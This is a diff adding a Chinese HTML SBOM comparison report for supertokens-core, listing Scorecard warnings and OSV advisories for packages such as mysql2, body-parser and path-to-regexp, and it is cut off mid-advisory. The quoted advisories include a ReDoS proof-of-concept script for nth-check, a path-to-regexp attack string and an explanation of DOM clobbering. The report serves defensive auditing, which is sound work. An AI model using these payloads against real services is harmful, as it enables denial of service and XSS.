@@ -1,0 +1,614 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="utf-8">
+            <title>SBOM 比较报告</title>
+            <style>
+                
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1, h2 {
+            color: #333;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+            word-wrap: break-word;
+            max-width: 800px;
+        }
+        th {
+            background-color: #f8f9fa;
+        }
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        .section-header {
+            font-weight: bold;
+            color: #2980b9;
+            margin-top: 10px;
+            display: block;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .cve-header {
+            font-weight: bold;
+            color: #e74c3c;
+            margin-top: 15px;
+            display: block;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .collapsible {
+            background-color: #f2f2f2;
+            color: #2980b9;
+            cursor: pointer;
+            padding: 18px;
+            width: 100%;
+            border: none;
+            text-align: left;
+            outline: none;
+            font-size: 18px;
+            margin-top: 20px;
+            border-radius: 5px 5px 0 0;
+            border-left: 5px solid #3498db;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .active, .collapsible:hover {
+            background-color: #e9ecef;
+        }
+        .content {
+            display: none;
+            overflow: hidden;
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 0 0 5px 5px;
+        }
+        .collapsible:after {
+            content: '+';
+            font-weight: bold;
+            float: right;
+            margin-left: 5px;
+        }
+        .active:after {
+            content: '-';
+        }
+        .security-score {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .score-summary {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .total-score {
+            font-size: 36px;
+            font-weight: bold;
+            color: #2980b9;
+        }
+        .score-percentage {
+            font-size: 24px;
+            color: #666;
+            margin: 0 10px;
+        }
+        .score-grade {
+            display: inline-block;
+            padding: 2px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-left: 10px;
+            color: white;
+        }
+        .grade-a {
+            background-color: #4CAF50;
+        }
+        .grade-b {
+            background-color: #FFC107;
+        }
+        .grade-c {
+            background-color: #FF9800;
+        }
+        .grade-d, .grade-f {
+            background-color: #F44336;
+        }
+        .category-score {
+            margin-bottom: 10px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .category-score-high {
+            background-color: #E8F5E9;
+        }
+        .category-score-medium {
+            background-color: #FFF8E1;
+        }
+        .category-score-low {
+            background-color: #FFEBEE;
+        }
+        .vuln-critical {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .vuln-high {
+            color: #f44336;
+            font-weight: bold;
+        }
+        .vuln-medium {
+            color: #ff9800;
+        }
+        .vuln-low {
+            color: #4caf50;
+        }
+        .vuln-unknown {
+            color: #9e9e9e;
+        }
+        .vuln-link {
+            word-break: break-all;
+            display: block;
+            padding: 3px 0;
+        }
+        .risk-container {
+            padding: 10px 0;
+        }
+        .risk-high {
+            background-color: #FFEAEA;
+            border-left: 4px solid #F44336;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(244, 67, 54, 0.1);
+        }
+        .risk-medium {
+            background-color: #FFF8E1;
+            border-left: 4px solid #FFC107;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(255, 193, 7, 0.1);
+        }
+        .risk-low {
+            background-color: #E8F5E9;
+            border-left: 4px solid #4CAF50;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(76, 175, 80, 0.1);
+        }
+        .stage-header {
+            background-color: #EFF8FF;
+            padding: 12px 15px;
+            margin: 25px 0 15px 0;
+            border-radius: 4px;
+            border-bottom: 2px solid #2196F3;
+            color: #1976D2;
+            font-weight: bold;
+            font-size: 17px;
+            box-shadow: 0 2px 4px rgba(33, 150, 243, 0.1);
+        }
+        .risk-category {
+            color: #333;
+            font-weight: bold;
+            font-size: 17px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+            padding-bottom: 5px;
+        }
+        .risk-description {
+            margin-bottom: 10px;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+        .risk-affected {
+            font-size: 14px;
+            margin-bottom: 10px;
+            padding: 5px;
+            background-color: rgba(255,255,255,0.5);
+            border-radius: 3px;
+        }
+        .risk-recommendation {
+            font-style: italic;
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.05);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        /* 版本降级警告样式 */
+        .warning-box {
+            background-color: #ffebee;
+            border: 2px solid #f44336;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            box-shadow: 0 2px 8px rgba(244, 67, 54, 0.2);
+        }
+        .warning-title {
+            color: #d32f2f;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #ffcdd2;
+            padding-bottom: 5px;
+        }
+        .warning-content {
+            color: #b71c1c;
+        }
+        .warning-note {
+            font-weight: bold;
+            color: #c62828;
+            margin-top: 10px;
+            font-style: italic;
+        }
+        .critical-detail {
+            color: #d32f2f;
+            font-weight: bold;
+            background-color: #ffebee;
+            padding: 3px 5px;
+            border-radius: 3px;
+        }
+        .details-list {
+            margin: 5px 0;
+            padding-left: 20px;
+        }
+        .impact-factors {
+            margin-top: 8px;
+            font-size: 0.9em;
+            color: #555;
+        }
+        .score {
+            padding: 2px 10px;
+            border-radius: 15px;
+            font-weight: bold;
+            color: white;
+        }
+        .score-high {
+            background-color: #4CAF50;
+        }
+        .score-medium {
+            background-color: #FFC107;
+        }
+        .score-low {
+            background-color: #F44336;
+        }
+        
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>SBOM 比较报告</h1>
+                <p>生成时间: 2025-04-05 13:28:15</p>
+                <p>SBOM A: sample_data\supertokens_supertokens-core_9e24d0e.json</p>
+                <p>SBOM B: sample_data\supertokens_supertokens-core.json</p>
+                
+                <h2>基本统计信息</h2>
+                <table>
+                    <tr>
+                        <th>新增包数量</th>
+                        <td>1</td>
+                    </tr>
+                    <tr>
+                        <th>移除包数量</th>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <th>版本变更数量</th>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <th>许可证变更数量</th>
+                        <td>0</td>
+                    </tr>
+                </table>
+                
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">软件供应链安全评分</span>
+                <span class="score score-high">9.1/10 (91.3%) [A+]</span>
+            </button>
+            <div class="content">
+                
+                <p class="score-summary">软件供应链安全评分为 9.1/10.0 (91.3%)，安全等级: A+。 软件供应链保持了较高的完整性和一致性。 主要影响因素：CII-Best-Practices风险, Vulnerabilities风险, Dangerous-Workflow风险, Token-Permissions风险, Security-Policy风险。</p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>类别</th>
+                            <th>得分</th>
+                            <th>详情</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        
+                <tr>
+                    <td>供应链完整性</td>
+                    <td class="score-high">1.7/1.7 (99.9%)</td>
+                    <td><ul class='details-list'><li>新增了1个包</li><li>供应链保持了较高的完整性，依赖结构稳定，无明显篡改迹象</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>版本一致性</td>
+                    <td class="score-high">3.5/3.5 (100.0%)</td>
+                    <td><ul class='details-list'><li>版本变更合理，主要是补丁和小版本更新</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>许可证合规性</td>
+                    <td class="score-high">0.9/0.9 (100.0%)</td>
+                    <td><ul class='details-list'><li>许可证变更较少，无明显合规风险</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>风险评估</td>
+                    <td class="score-high">2.6/2.6 (100.0%)</td>
+                    <td><ul class='details-list'><li>风险分析未发现明显的安全问题</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>Scorecard评估</td>
+                    <td class="score-low">0.4/1.3 (33.0%)</td>
+                    <td><ul class='details-list'><li>Binary-Artifacts需要改进</li><li>Code-Review需要改进</li><li>以下项目风险较高: CII-Best-Practices, Vulnerabilities, Dangerous-Workflow, Token-Permissions, Security-Policy</li><li>
+已知漏洞信息:</li><li>- Warn: Project is vulnerable to: GHSA-mqr2-w7wj-jjgr (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-mqr2-w7wj-jjgr</li><li>- Warn: Project is vulnerable to: GHSA-49j4-86m8-q2jw (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-49j4-86m8-q2jw</li><li>- Warn: Project is vulnerable to: GHSA-fpw7-j2hg-69v5 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-fpw7-j2hg-69v5</li><li>- Warn: Project is vulnerable to: GHSA-4rch-2fh8-94vw (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-4rch-2fh8-94vw</li><li>- Warn: Project is vulnerable to: GHSA-pmh2-wpjm-fj45 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-pmh2-wpjm-fj45</li><li>- Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8</li><li>- Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7</li><li>- Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x</li><li>- Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275</li><li>- Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx</li><li>- Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27</li><li>- Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv</li><li>- Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55</li><li>- Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr</li><li>- Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j</li><li>- Warn: Project is vulnerable to: GHSA-rhx6-c78j-4q9w (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-rhx6-c78j-4q9w</li><li>- Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j</li><li>- Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm</li><li>- Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg</li><li>- Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p</li><li>- Warn: Project is vulnerable to: GHSA-4vvj-4cpr-p986 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-4vvj-4cpr-p986</li><li>项目安全实践亟需加强</li></ul><div class='impact-factors'><strong>影响因素:</strong> CII-Best-Practices风险, Vulnerabilities风险, Dangerous-Workflow风险, Token-Permissions风险, Security-Policy风险, 存在已知漏洞, 整体安全实践不足</div></td>
+                </tr>
+                
+                    </tbody>
+                </table>
+            </div>
+            
+                
+                    <button type="button" class="collapsible">
+                        <span style="flex-grow: 1;">漏洞信息（来源：OSV） (21)</span>
+                        <span style="font-size:14px;color:#666">点击展开/收起</span>
+                    </button>
+                    <div class="content">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th style="width: 25%">漏洞ID</th>
+                                    <th style="width: 75%">描述</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-fpw7-j2hg-69v5</td>
+                            <td>Versions of the package mysql2 before 3.9.4 are vulnerable to Remote Code Execution (RCE) via the `readCodeFor` function due to improper validation of the `supportBigNumbers` and `bigNumberStrings` values.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21508<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21508</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/pull/2572</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805</span><br><span class="vuln-link">https://blog.slonser.info/posts/mysql2-attacker-configuration</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js%23L14C10-L14C21</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/releases/tag/v3.9.4</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6591085</span><br><br><div class="section-header">影响范围: </div><br>mysql2: 所有版本 &lt; 3.9.4 <br><br><br><div class="cve-header">来自 CVE-2024-21508 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-4rch-2fh8-94vw</td>
+                            <td>Versions of the package mysql2 before 3.9.7 are vulnerable to Arbitrary Code Injection due to improper sanitization of the timezone parameter in the readCodeFor function by calling a native MySQL Server date/time function.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21511<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21511</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/pull/2608</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/commit/7d4b098c7e29d5a6cb9eac2633bfcc2f0f1db713</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/releases/tag/v3.9.7</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6670046</span><br><br><div class="section-header">影响范围: </div><br>mysql2: 所有版本 &lt; 3.9.7 <br><br><br><div class="cve-header">来自 CVE-2024-21511 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-pmh2-wpjm-fj45</td>
+                            <td>Versions of the package mysql2 before 3.9.8 are vulnerable to Prototype Pollution due to improper user input sanitization passed to fields and tables when using nestTables.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21512<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21512</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/pull/2702</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/commit/efe3db527a2c94a63c2d14045baba8dfefe922bc</span><br><span class="vuln-link">https://gist.github.com/domdomi3/e9f0f9b9b1ed6bfbbc0bea87c5ca1e4a</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-7176010</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6861580</span><br><br><div class="section-header">影响范围: </div><br>mysql2: 所有版本 &lt; 3.9.8 <br><br><br><div class="cve-header">来自 CVE-2024-21512 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7</td>
+                            <td>### Impact<br><br>body-parser &amp;lt;1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.<br><br>### Patches<br><br>this issue is patched in 1.20.3<br><br>### References<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-45590<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/expressjs/body-parser/security/advisories/GHSA-qwcr-r2fm-qrc7</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-45590</span><br><span class="vuln-link">https://github.com/expressjs/body-parser/commit/b2695c4450f06ba3b0ccf48d872a229bb41c9bce</span><br><span class="vuln-link">https://github.com/expressjs/body-parser</span><br><br><div class="section-header">影响范围: </div><br>body-parser: 所有版本 &lt; 1.20.3 <br><br><br><div class="cve-header">来自 CVE-2024-45590 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275</td>
+                            <td>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21538<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/issues/165</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/pull/160</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</span><br><br><div class="section-header">影响范围: </div><br>cross-spawn: &gt;= 7.0.0 &lt; 7.0.5 <br>cross-spawn: 所有版本 &lt; 6.0.6 <br><br><br><div class="cve-header">来自 CVE-2024-21538 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27</td>
+                            <td>Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21536<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21536</span><br><span class="vuln-link">https://github.com/chimurai/http-proxy-middleware/commit/0b4274e8cc9e9a2c5a06f35fbf456ccfcebc55a5</span><br><span class="vuln-link">https://github.com/chimurai/http-proxy-middleware/commit/788b21e4aff38332d6319557d4a5b1b13b1f9a22</span><br><span class="vuln-link">https://gist.github.com/mhassan1/28be67266d82a53708ed59ce5dc3c94a</span><br><span class="vuln-link">https://github.com/chimurai/http-proxy-middleware</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-HTTPPROXYMIDDLEWARE-8229906</span><br><br><div class="section-header">影响范围: </div><br>http-proxy-middleware: 所有版本 &lt; 2.0.7 <br>http-proxy-middleware: &gt;= 3.0.0 &lt; 3.0.3 <br><br><br><div class="cve-header">来自 CVE-2024-21536 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr</td>
+                            <td>There is a Regular Expression Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when parsing crafted invalid CSS nth-checks.<br><br>The ReDoS vulnerabilities of the regex are mainly due to the sub-pattern `\s*(?:([+-]?)\s*(\d+))?` with quantified overlapping adjacency and can be exploited with the following code.<br><br>**Proof of Concept**<br>```js<br>// PoC.js<br>var nthCheck = require(&amp;quot;nth-check&amp;quot;)<br>for(var i = 1; i &amp;lt;= 50000; i++) {<br>    var time = Date.now();<br>    var attack_str = &amp;#39;2n&amp;#39; + &amp;#39; &amp;#39;.repeat(i*10000)+&amp;quot;!&amp;quot;;<br>    try {<br>        nthCheck.parse(attack_str) <br>    }<br>    catch(err) {<br>        var time_cost = Date.now() - time;<br>        console.log(&amp;quot;attack_str.length: &amp;quot; + attack_str.length + &amp;quot;: &amp;quot; + time_cost+&amp;quot; ms&amp;quot;)<br>    }<br>}<br>```<br><br>**The Output**<br>```<br>attack_str.length: 10003: 174 ms<br>attack_str.length: 20003: 1427 ms<br>attack_str.length: 30003: 2602 ms<br>attack_str.length: 40003: 4378 ms<br>attack_str.length: 50003: 7473 ms<br>```<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2021-3803<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2021-3803</span><br><span class="vuln-link">https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726</span><br><span class="vuln-link">https://github.com/fb55/nth-check</span><br><span class="vuln-link">https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0</span><br><span class="vuln-link">https://lists.debian.org/debian-lts-announce/2023/05/msg00023.html</span><br><br><div class="section-header">影响范围: </div><br>nth-check: 所有版本 &lt; 2.0.1 <br><br><br><div class="cve-header">来自 CVE-2021-3803 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j</td>
+                            <td>### Impact<br><br>A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.<br><br>### Patches<br><br>For users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.<br><br>These versions add backtrack protection when a custom regex pattern is not provided:<br><br><span class="vuln-link">[0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)</span><br><span class="vuln-link">[1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)</span><br><span class="vuln-link">[3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)</span><br><span class="vuln-link">[6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)</span><br><br>They do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.<br><br>Version [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.<br><br>Version [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.<br><br>### Workarounds<br><br>All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.<br><br>If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.<br><br>### Details<br><br>Using `/:a-:b` will produce the regular expression `/^\/([^\/]+?)-([^\/]+?)\/?$/`. This can be exploited by a path such as `/a${&amp;#39;-a&amp;#39;.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.<br><br>Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.<br><br>### References<br><br>* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)<br>* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-45296<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-45296</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0</span><br><span class="vuln-link">https://security.netapp.com/advisory/ntap-20250124-0001</span><br><br><div class="section-header">影响范围: </div><br>path-to-regexp: &gt;= 0.2.0 &lt; 1.9.0 <br>path-to-regexp: 所有版本 &lt; 0.1.10 <br>path-to-regexp: &gt;= 7.0.0 &lt; 8.0.0 <br>path-to-regexp: &gt;= 2.0.0 &lt; 3.3.0 <br>path-to-regexp: &gt;= 4.0.0 &lt; 6.3.0 <br><br><br><div class="cve-header">来自 CVE-2024-45296 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-rhx6-c78j-4q9w</td>
+                            <td>### Impact<br><br>The regular expression that is vulnerable to backtracking can be generated in the 0.1.x release of `path-to-regexp`, originally reported in CVE-2024-45296<br><br>### Patches<br><br>Upgrade to 0.1.12.<br><br>### Workarounds<br><br>Avoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.<br><br>### References<br><br><span class="vuln-link">https://github.com/advisories/GHSA-9wv6-86v2-598j</span><br><span class="vuln-link">https://blakeembrey.com/posts/2024-09-web-redos/</span><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-52798<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-52798</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4</span><br><span class="vuln-link">https://blakeembrey.com/posts/2024-09-web-redos</span><br><span class="vuln-link">https://github.com/pillarjs/path-to-regexp</span><br><span class="vuln-link">https://security.netapp.com/advisory/ntap-20250124-0002</span><br><br><div class="section-header">影响范围: </div><br>path-to-regexp: 所有版本 &lt; 0.1.12 <br><br><br><div class="cve-header">来自 CVE-2024-52798 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm</td>
+                            <td>### Summary<br><br>We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.<br><br>It&amp;#39;s worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.<br><br>### Details<br><br>#### Backgrounds<br><br>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:<br><br>[1] https://scnps.co/papers/sp23_domclob.pdf<br>[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/<br><br>#### Gadget found in `rollup`<br><br>We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.<br><br>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162<br><br>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185<br><br>However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&amp;#39;s named DOM tree element access mechanism. This manipulation 